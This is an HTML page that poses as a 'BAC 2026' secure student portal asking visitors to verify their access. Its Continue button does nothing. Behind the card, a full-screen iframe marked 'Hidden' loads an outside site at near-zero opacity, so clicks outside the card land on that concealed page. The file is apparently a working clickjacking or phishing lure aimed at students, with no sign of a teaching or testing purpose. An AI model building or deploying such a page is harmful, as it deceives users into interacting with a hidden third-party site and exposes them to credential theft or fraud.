<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Student Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * {
      box-sizing: border-box;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    body {
      margin: 0;
      background: linear-gradient(135deg, #0a2a3a, #0f3a55, #1a4d72); /* Slightly deeper tones for clarity */
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }

    .card {
      width: 360px;
      background: #222;
      border-radius: 16px;
      padding: 32px;
      box-shadow: 0 15px 45px rgba(0, 0, 0, 0.5);
      text-align: center;
      position: relative;
      z-index: 2;
      transition: all 0.3s ease-in-out;
    }

    .card:hover {
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7);
    }

    .card h1 {
      margin: 0 0 10px;
      font-size: 26px;
      font-weight: 600;
      color: #00d4ff;
    }

    .card p {
      font-size: 16px;
      opacity: 0.85;
      margin-bottom: 25px;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #00d4ff;
      color: #000;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .btn:hover {
      background: #00b8dd;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      opacity: 0.05; /* Even more subtle, but still present */
      z-index: 1;
    }
  </style>
</head>
<body>

  <!-- Hidden iframe with subtle effect -->
  <iframe src="https://fierce-gibbon.super.site"></iframe>

  <!-- Main content card -->
  <div class="card">
    <h1>BAC 2026 Portal</h1>
    <p>Verify your student access to continue</p>
    <button class="btn">Continue</button>
  </div>

</body>
</html>
